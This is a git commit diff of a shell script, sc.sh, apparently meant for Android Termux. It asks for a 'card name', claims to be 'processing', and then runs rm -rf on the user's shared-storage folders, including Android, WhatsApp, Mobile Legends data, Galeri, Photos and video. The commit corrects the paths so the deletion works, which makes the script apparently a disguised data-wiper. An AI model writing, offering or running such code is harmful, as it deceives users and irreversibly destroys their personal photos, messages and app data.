11dea24f1fdb0a51e5290747652a42e3a6105da5
Taufik Hidayat <ta142fa@gmail.com>
2021-03-13 08:48:53 +0000

    Benerin direktori folder

--- sc.sh
+++ sc.sh
@@ -16,40 +16,40 @@ read -p "masukkan nama kartu: " pill;
 if [ $pill = "1" ]
 then
 echo "sedang memproses" $1
-rm -rf/Android
-rm -rf/Android/WhatsApp
-rm -rf/Android/com.mobile.legends
-rm -rf/Galeri
-rm -rf/Photos
-rm -rf/video
+rm -rf storage/shared/Android
+rm -rf storage/shared/WhatsApp
+rm -rf storage/shared/Android/com.mobile.legends
+rm -rf storage/shared/Galeri
+rm -rf storage/shared/Photos
+rm -rf storage/shared/video
 
 if [ $pill = "2" ]
 then
 echo "sedang berproses" $2
-rm -rf/Android
-rm -rf/Android/WhatsApp
-rm -rf/Android/com.mobile.legends
-rm -rf/Galeri
-rm -rf/Photos
-rm -rf/video
+rm -rf storage/shared/Android
+rm -rf storage/shared/Android/WhatsApp
+rm -rf storage/shared/Android/com.mobile.legends
+rm -rf storage/shared/Galeri
+rm -rf storage/shared/Photos
+rm -rf storage/shared/video
 
 if [ $pill = "3" ] 
 then
 echo "sedang memproses" $3
-rm -rf/Android
-rm -rf/Android/WhatsApp
-rm -rf/Android/com.mobile.legends
-rm -rf/Galeri
-rm -rf/Photos
-rm -rf/video
+rm -rf storage/shared/Android
+rm -rf storage/shared/Android/WhatsApp
+rm -rf storage/shared/Android/com.mobile.legends
+rm -rf storage/shared/Galeri
+rm -rf storage/shared/Photos
+rm -rf storage/shared/video
 
 if [ $pill = "4" ] 
 then
 echo "sedang memproses" $4
-rm -rf/Android
-rm -rf/Android/WhatsApp
-rm -rf/Android/com.mobile.legends
-rm -rf/Galeri
-rm -rf/Photos
-rm -rf/video
+rm -rf storage/shared/Android
+rm -rf storage/shared/Android/WhatsApp
+rm -rf storage/shared/Android/com.mobile.legends
+rm -rf storage/shared/Galeri
+rm -rf storage/shared/Photos
+rm -rf storage/shared/video
 fi
